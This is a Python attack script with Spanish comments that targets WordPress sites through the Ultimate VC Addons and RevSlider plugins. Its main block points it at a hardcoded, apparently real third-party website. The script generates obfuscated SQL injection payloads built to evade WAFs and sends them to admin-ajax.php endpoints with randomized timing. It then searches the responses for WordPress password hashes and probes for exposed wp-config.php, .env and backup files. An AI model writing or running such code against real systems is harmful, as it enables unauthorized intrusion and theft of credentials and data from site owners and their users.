import requests
import time
import json
import base64
import random
from urllib.parse import quote


class UltimateVCExploiter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.set_headers()

    def set_headers(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': self.target,
            'Referer': f'{self.target}/',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }

    def generate_evasion_payloads(self):
        """Generar payloads ofuscados para evadir WAF"""

        base_payloads = [
            # Payloads básicos
            "1",
            "test",
            "true",
            "false",
            "null",

            # SQL Injection ofuscada
            "1'||'1'||'1",
            "1'||SLEEP(2)||'1",
            "1'/**/OR/**/1=1-- -",
            "1'/*!50000OR*/1=1-- -",
            "1' XOR 1=1-- -",
            "1' DIV 1 LIKE 1-- -",
            "1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))-- -",

            # Union selects ofuscados
            "1' UNI/**/ON/**/SEL/**/ECT 1,2,3-- -",
            "1'/*!50000UNION*//**//*!50000SELECT*/1,2,3-- -",
            "1' UnIoN SeLeCt 1,2,3-- -",
            "1'%20UnIoN%20SeLeCt%201,2,3-- -",

            # Error-based ofuscada
            "1' AND EXTRACTVALUE(0,CONCAT(0x7e,(SELECT USER())))-- -",
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1)-- -",

            # Time-based ofuscada
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",
            "1' AND BENCHMARK(5000000,MD5('test'))-- -",

            # Blind boolean
            "1' AND ASCII(SUBSTRING((SELECT USER()),1,1))>0-- -",
            "1' AND LENGTH((SELECT USER()))>0-- -"
        ]

        # Codificaciones adicionales
        encoded_payloads = []
        for payload in base_payloads:
            # URL encode
            encoded_payloads.append(quote(payload))
            # Base64 encode
            encoded_payloads.append(base64.b64encode(payload.encode()).decode())
            # Double URL encode
            encoded_payloads.append(quote(quote(payload)))

        return base_payloads + encoded_payloads

    def test_ajax_endpoint(self, endpoint, data):
        """Probar endpoint AJAX con evasión"""

        url = f"{self.target}{endpoint}"

        for payload in self.generate_evasion_payloads():
            # Modificar el payload en los datos
            test_data = data.copy()
            for key in test_data:
                if isinstance(test_data[key], str) and 'PAYLOAD' in test_data[key]:
                    test_data[key] = test_data[key].replace('PAYLOAD', payload)
                elif key in ['param', 'id', 'data', 'value']:
                    test_data[key] = payload

            try:
                print(f"[?] Probando: {payload[:50]}...")

                # Aleatorizar delays
                time.sleep(random.uniform(0.5, 1.5))

                r = self.session.post(url, data=test_data, headers=self.headers, timeout=10)

                print(f"    Status: {r.status_code} | Tamaño: {len(r.text)}")

                # Análisis de respuesta
                if r.status_code == 200:
                    self.analyze_response(r.text, payload)
                elif r.status_code == 500:
                    print("    [!] ERROR 500 - Posible SQLi (error del servidor)")
                elif r.status_code == 403:
                    print("    [-] Bloqueado por WAF")
                else:
                    print(f"    [-] Respuesta inusual: {r.status_code}")

            except requests.exceptions.Timeout:
                print("    [!] TIMEOUT - Posible time-based SQLi")
            except Exception as e:
                print(f"    [-] Error: {e}")

    def analyze_response(self, response, payload):
        """Analizar respuesta en busca de indicios de vulnerabilidad"""

        indicators = {
            'mysql': ['mysql', 'mysqli', 'sql syntax', 'database', 'you have an error'],
            'wp_data': ['wp_', 'user_login', 'user_pass', 'admin', 'wordpress'],
            'union': ['1', '2', '3', 'union', 'select'],
            'error': ['error', 'warning', 'notice', 'exception']
        }

        response_lower = response.lower()

        for indicator_type, keywords in indicators.items():
            for keyword in keywords:
                if keyword in response_lower:
                    print(f"    [!] INDICIO {indicator_type.upper()}: '{keyword}' encontrado")
                    return True

        # Buscar hashes de WordPress
        if '$P$' in response or '$2y$' in response:
            print("    [!] HASH DE WORDPRESS ENCONTRADO!")
            return True

        return False

    def exploit_ultimate_vc(self):
        """Explotación principal para Ultimate VC Addons"""

        print("[+] INICIANDO EXPLOTACIÓN ULTIMATE VC ADDONS")

        endpoints_data = [
            # Endpoint principal
            {
                'endpoint': '/wp-admin/admin-ajax.php',
                'data': {
                    'action': 'ultimate_ajax_action',
                    'function': 'get_ultimate_data',
                    'param': 'PAYLOAD'
                }
            },
            # Endpoints alternativos
            {
                'endpoint': '/wp-admin/admin-ajax.php',
                'data': {
                    'action': 'ultimate_ajax_action',
                    'function': 'info_table_data',
                    'package_id': 'PAYLOAD'
                }
            },
            {
                'endpoint': '/wp-admin/admin-ajax.php',
                'data': {
                    'action': 'ultimate_ajax_action',
                    'function': 'get_stats_data',
                    'counter_id': 'PAYLOAD'
                }
            }
        ]

        for endpoint_config in endpoints_data:
            print(f"\n[+] Probando endpoint: {endpoint_config['endpoint']}")
            self.test_ajax_endpoint(endpoint_config['endpoint'], endpoint_config['data'])

    def exploit_revslider(self):
        """Explotación para RevSlider como alternativa"""

        print("\n[+] PROBANDO REVSLIDER COMO ALTERNATIVA")

        revslider_endpoints = [
            {
                'endpoint': '/wp-admin/admin-ajax.php',
                'data': {
                    'action': 'revslider_ajax_action',
                    'client_action': 'get_product_images',
                    'id': 'PAYLOAD'
                }
            },
            {
                'endpoint': '/wp-admin/admin-ajax.php',
                'data': {
                    'action': 'revslider_ajax_action',
                    'client_action': 'get_slider_html',
                    'data': 'PAYLOAD'
                }
            }
        ]

        for endpoint_config in revslider_endpoints:
            print(f"\n[+] Probando RevSlider: {endpoint_config['endpoint']}")
            self.test_ajax_endpoint(endpoint_config['endpoint'], endpoint_config['data'])

    def direct_file_access(self):
        """Intentar acceso directo a archivos"""

        print("\n[+] BUSCANDO ARCHIVOS EXPUESTOS")

        files = [
            "/wp-config.php",
            "/wp-content/plugins/Ultimate_VC_Addons/readme.txt",
            "/wp-content/plugins/revslider/readme.txt",
            "/.env",
            "/backup.sql",
            "/wp-content/debug.log"
        ]

        for file in files:
            url = f"{self.target}{file}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"[!] ARCHIVO EXPUESTO: {file}")
                    if any(keyword in r.text for keyword in ['DB_PASSWORD', 'password', 'user_login']):
                        print(f"    [!] CONTIENE DATOS SENSIBLES!")
            except:
                pass

    def run_complete_exploit(self):
        """Ejecutar explotación completa"""

        print("=" * 60)
        print("EXPLOTADOR ULTIMATE VC ADDONS + REVSLIDER")
        print("=" * 60)

        # 1. Archivos expuestos
        self.direct_file_access()

        # 2. Ultimate VC Addons
        self.exploit_ultimate_vc()

        # 3. RevSlider como backup
        self.exploit_revslider()

        print("\n" + "=" * 60)
        print("EXPLOTACIÓN COMPLETADA")
        print("=" * 60)


# USO
if __name__ == "__main__":
    target = "https://gimnasioflorida.com"
    exploiter = UltimateVCExploiter(target)
    exploiter.run_complete_exploit()